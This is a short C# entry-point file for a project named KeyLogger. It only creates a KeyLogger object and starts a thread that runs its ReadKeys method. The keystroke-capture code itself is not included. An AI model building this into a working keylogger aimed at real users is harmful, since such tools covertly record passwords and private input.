using System.Threading;

namespace KeyLogger
{
    class Program
    {
        static void Main(string[] args)
        {
            KeyLogger keyLogger = new KeyLogger();
            Thread thread = new Thread(new ThreadStart(keyLogger.ReadKeys));
            thread.Start();
        }
    }
}
